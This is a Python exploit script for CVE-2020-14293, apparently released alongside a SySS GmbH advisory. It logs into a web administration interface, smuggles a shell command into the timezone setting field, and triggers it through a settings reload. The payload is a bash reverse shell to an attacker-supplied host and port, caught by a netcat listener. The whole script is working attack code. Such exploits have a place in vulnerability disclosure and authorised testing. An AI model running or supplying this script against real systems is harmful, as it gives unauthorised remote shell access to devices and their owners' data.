#!/usr/bin/env python
# This exploit was written by Patrick Hener, SySS GmbH
# Advisory: SYSS-2020-025 (https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-025.txt)
# CVE: CVE-2020-14293
# exploit-db: https://exploit-db.com/exploits/xxxxxxx
# Requirements: netcat listener running

import requests
import re
import os
import sys
from urllib3.exceptions import InsecureRequestWarning

# Setup of args
if len(sys.argv) < 6:
    print(
        f"usage: python {sys.argv[0]} username[admin] password[admin] lhost[192.168.x.x] lport[4444] url[https://ip:10000]")
    sys.exit(0)

user = sys.argv[1]
password = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]
url = sys.argv[5]

# You can but do not have to modify this
payload = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'

# omit ssl warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Setup Cookie jar for session cookie
session = requests.Session()


def preflight():
    # Preflight GET for getting session_id
    preflight_response = session.get(url, verify=False)

    return preflight_response


def login():
    # Login request
    login_data = {'dcfct': 'DCbase.login',
                  'username': user, 'password': password}
    login_response = session.post(url, login_data, verify=False)

    return login_response


def inject_payload():
    files = {
        'dcfct': (None, 'DCbase.pageinput'),
        'dbkey:datetime.clock.timezone': (None, f'Europe/Berlin /etc/localtime; {payload}; cat'),
        'submit': (None, 'save')
    }
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0",
               "Accept-Encoding": "gzip, deflate",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Connection": "close",
               "Accept-Language": "en-US,en;q=0.5",
               "Referer": f"{url}/smenu/td_timezone",
               "Upgrade-Insecure-Requests": "1"}

    payload_response = session.post(f"{url}/page/td_timezone", headers=headers, files=files, verify=False)

    return payload_response


def trigger_activation():
    # Trigger activation by activating settings changes
    trigger_response = session.get(f"{url}/reconf", verify=False)

    return trigger_response

def trigger_check():
    # Postflight request
    trigger_response = session.get(f"{url}/reconfshow", verify=False)

    return trigger_response


if __name__ == "__main__":
    # Stage 1 preflight
    print("[*] sending preflight request to acquire session_id")
    preflight_response = preflight()
    if preflight_response.status_code == 200:
        print("[+] session_id acquired")
    else:
        print("[-] session_id could not be acquired.")
        sys.exit(0)
    # Stage 2 login
    print("[*] sending login request to validate session.")
    login_response = login()
    has_error = re.search('Error', login_response.text)
    if not has_error:
        print("[+] login was successful")
    else:
        print("[-] there was something wrong with the login -> check credentials again")
        sys.exit(0)
    # Stage 3 inject payload
    print(f"[*] Trying to inject payload: {payload}")
    # Weird stuff, have to send 2 times!?
    payload_response = inject_payload()
    payload_response = inject_payload()
    if payload_response.status_code == 200:
        print("[+] successfully injected payload")
    else:
        print("[-] something went wrong injecting the payload")
        sys.exit(0)
    # Stage 4 triggering payload
    print("[*] activating settings changes to trigger payload")
    trigger_response = trigger_activation()
    print("[*] be sure to have your listener running at this point.\n[*] Shell should pop every second")
    trigger_response = trigger_check()
    sys.exit()
